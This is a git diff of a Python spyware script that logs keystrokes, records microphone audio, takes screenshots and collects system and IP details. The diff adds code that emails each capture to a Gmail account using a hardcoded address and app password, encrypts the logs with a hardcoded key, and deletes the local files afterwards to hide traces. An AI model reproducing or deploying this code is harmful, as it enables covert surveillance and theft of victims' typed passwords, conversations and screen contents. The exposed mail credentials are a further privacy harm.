@@ -8,7 +8,6 @@ import smtplib
 import socket
 import platform
 
-import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
@@ -20,9 +19,6 @@ import wave
 
 from cryptography.fernet import Fernet
 
-import getpass
-from requests import get
-
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
@@ -30,15 +26,30 @@ key_info = r"/key_log.txt"
 system_info = r"/sys_details.txt"
 audio_info = r"/audio_rec.wav"
 screenshot_info = r"/screenshot.png"
-log_dir = r"/Users/kenluong/Developer/python"
 
-audio_time = 10
-iter_time = 20
-iter_end = 3
+e_key_info = r"/e_key_log.txt"
+e_system_info = r"/e_sys_details.txt"
+key = "1eW-jn8BhjrXv2ObHZUnjNxqxhShCs2TOOsrvrY8dls="
+
+log_dir = r"/Users/kenluong/Developer/python/Keylogger"
+
+audio_time = 5
 
 email_addr = "anteikuu20@gmail.com"
 password = "erfe mdvm mnck pghf"
 toaddr = "anteikuu20@gmail.com"
+
+keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+
+def on_press(key):
+    logging.info(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
 def send_email(filename, attachment, toaddr):
     fromaddr = email_addr
@@ -74,15 +85,16 @@ def send_email(filename, attachment, toaddr):
 send_email(key_info, log_dir + key_info, toaddr)
 
 def system_details():
-    with open(log_dir + system_info, "a") as f:
+    with open(log_dir + system_info, 'a') as f:
         hostname = socket.gethostname()
         ip_addr = socket.gethostbyname(hostname)
         try:
-            ip_public = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + ip_public + "\n")
+            #ip_public = get("https://api.ipify.org").text
+            #f.write("Public IP Address: " + ip_public + "\n")
+            False
 
         except Exception:
-            f.write("Failed to retrieve Public IP Address\n")
+            f.write("Failed to retrieve Public IP Address (max query)\n")
 
         f.write("Processor: " + platform.processor() + "\n")
         f.write("System: " + platform.system() + " " + platform.version() + "\n")
@@ -115,7 +127,7 @@ def mic_audio():
     stream.close()
     p.terminate()
 
-    wf = wave.open(log_dir + audio_info, "wb")
+    wf = wave.open(log_dir + audio_info, 'wb')
     wf.setnchannels(channels)
     wf.setsampwidth(p.get_sample_size(format))
     wf.setframerate(freq)
@@ -123,43 +135,33 @@ def mic_audio():
     wf.close()
 
 mic_audio()
+send_email(audio_info, log_dir + audio_info, toaddr)
 
 def screenshot():
     im = ImageGrab.grab()
     im.save(log_dir + screenshot_info)
 
 screenshot()
+send_email(screenshot_info, log_dir + screenshot_info, toaddr)
 
-iter_num = 0
-start_time = time.time()
-stop_time = time.time() + iter_time
+files = [log_dir + key_info, log_dir + system_info]
+encrypted_files = [log_dir + e_key_info, log_dir + e_system_info]
 
-while iter_num < iter_end:
+count = 0
 
-    keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+for encrypting_files in files:
+    with open(files[count], 'rb') as f:
+        data = f.read()
 
-    def on_press(key):
-        global curr_time
-        curr_time = time.time()
-        logging.info(str(key))
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
 
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if curr_time > stop_time:
-            return False
+    with open(encrypted_files[count], 'wb') as f:
+        f.write(encrypted)
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    send_email(encrypted_files[count], encrypted_files[count], toaddr)
+    count += 1
 
-    if curr_time > stop_time:
-        with open(log_dir + key_info, "w") as f:
-            f.write(" ")
-
-        screenshot()
-        send_email(screenshot_info, log_dir + screenshot_info, toaddr)
-
-        iter_num += 1
-
-        curr_time = time.time()
-        stop_time = time.time() + iter_time
+delete_files = [system_info, key_info, screenshot_info, audio_info]
+for file in delete_files:
+    os.remove(log_dir + file)
